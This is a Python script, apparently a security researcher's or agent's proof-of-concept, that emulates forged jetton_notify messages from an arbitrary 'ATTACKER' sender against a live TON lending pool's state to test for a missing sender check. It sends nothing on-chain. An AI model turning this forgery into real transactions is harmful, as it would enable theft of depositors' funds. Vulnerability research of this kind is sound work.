#!/usr/bin/env python3
"""
Affluent BasicPool local TVM emulation of a FORGED jetton_notify (op 0x7362d09c)
from an arbitrary (non-jetton-wallet) sender.

READ-ONLY: lite-server account-state reads + local TVM emulation only.
No transaction is signed/sent. No secrets.
"""
import sys, json, base64, time
from tonpy.types import LiteClient, Address, Cell, CellBuilder, VmDict
from tonpy.tvm import Emulator
from tonpy.autogen.block import Account

POOL = "EQCrEHHG4Ff8TD3PzuH5tFSwHBD3zxeXaosz48jGLebwiiNx"
ATTACKER = "0:34461ba017e4799eeee0628521e505226ef405e087cabb765eb50a882e5550a2"
LENDING_VAULT = "0:06b609ebd46d170e294651170e077a54865f8ba3ffc9f936893f42b87b2f1cb9"
JETTON_NOTIFY = 0x7362d09c

def coins(b, v):
    if v == 0:
        b.store_uint(0, 4); return
    nb = (v.bit_length() + 7) // 8
    b.store_uint(nb, 4); b.store_uint(v, nb * 8)

def build_notify_body(query_id, amount, sender_addr):
    b = CellBuilder()
    b.store_uint(JETTON_NOTIFY, 32)
    b.store_uint(query_id, 64)
    coins(b, amount)
    b.store_address(Address(sender_addr))
    b.store_bool(False)
    return b.end_cell()

def build_int_msg(src, dest, value_nano, body, lt, now):
    m = CellBuilder()
    m.store_bool(False); m.store_bool(True); m.store_bool(True); m.store_bool(False)
    m.store_address(Address(src)); m.store_address(Address(dest))
    coins(m, value_nano); m.store_bool(False); coins(m, 0); coins(m, 0)
    m.store_uint(lt, 64); m.store_uint(now, 32)
    m.store_bool(False); m.store_bool(True); m.store_ref(body)
    return m.end_cell()

def _data_from_account(acc):
    if acc is None or not hasattr(acc, "storage"):
        return None
    stt = acc.storage.state
    if not hasattr(stt, "x"):
        return None
    d = stt.x.data
    return None if d is None else getattr(d, "value", d)

def data_cell_account(account_cell):
    """account_cell is an Account cell (from shard_state ref)."""
    from tonpy.autogen.block import Account
    return _data_from_account(Account().cell_unpack(account_cell, rec_unpack=True))

def data_cell_shardaccount(sa_cell):
    """sa_cell is a ShardAccount cell (as returned by the emulator)."""
    from tonpy.autogen.block import ShardAccount
    sa = ShardAccount().cell_unpack(sa_cell, rec_unpack=True)
    return _data_from_account(sa.account if sa is not None else None)

def clean_config(cfg):
    new = VmDict(32)
    n = 0
    for k, cs in cfg.get_iter():
        if k == 43:
            continue
        new.set(k, cs); n += 1
    return new, n

def main():
    lc = LiteClient(mode="roundrobin", timeout=3, num_try=5)
    blk = lc.get_masterchain_info_ext().last
    now = lc.get_time()
    st = lc.get_account_state(Address(POOL), blk)
    lt = st.last_trans_lt + 1
    ss = st.to_shard_state()
    acct_cell = ss.begin_parse().load_ref()
    dbefore = data_cell_account(acct_cell)
    hbefore = dbefore.get_hash()
    print(f"[live] pool lt={st.last_trans_lt} seqno={blk.id.seqno} now={now} data_hash={hbefore}")
    open("/tmp/opencode/aff/live_pool_data.boc","wb").write(base64.b64decode(dbefore.to_boc()))

    _, cfgraw = lc.get_config_all(blk)
    cfg, nkeys = clean_config(cfgraw)
    print(f"[cfg] params copied={nkeys} (dropped 43)")

    runs = [
        ("forge_att_0",      ATTACKER,      0),
        ("forge_att_1e12",   ATTACKER,      10**12),
        ("forge_att_1e18",   ATTACKER,      10**18),
        ("forge_vault_0",    LENDING_VAULT, 0),
        ("forge_vault_1e12", LENDING_VAULT, 10**12),
    ]
    results = {}
    for name, sender, amount in runs:
        body = build_notify_body(1700000000000, amount, sender)
        msg = build_int_msg(ATTACKER, POOL, 1_500_000_000, body, lt, now)
        em = Emulator(cfg)
        em.set_ignore_chksig(True)
        try:
            ok = em.emulate_transaction(ss, msg, now, lt)
        except Exception as e:
            print(f"[{name}] ERR {e!r}"); results[name] = {"error": repr(e)}; continue
        acct_after = em.account.to_cell()
        try:
            dafter = data_cell_shardaccount(acct_after)
            hafter = dafter.get_hash()
        except Exception as e:
            hafter = f"ERR {e!r}"; dafter = None
        changed = hafter != hbefore
        print(f"[{name}] ok={ok} data_changed={changed} after={hafter}")
        if dafter is not None:
            open(f"/tmp/opencode/aff/after_{name}.boc","wb").write(base64.b64decode(dafter.to_boc()))
        results[name] = {"ok": ok, "data_changed": changed, "after_hash": hafter,
                         "amount": amount, "sender": sender}
    json.dump({"before_hash": hbefore, "runs": results},
              open("/tmp/opencode/aff/emu_local_results.json","w"), indent=1)
    print("DONE")

if __name__ == "__main__":
    main()
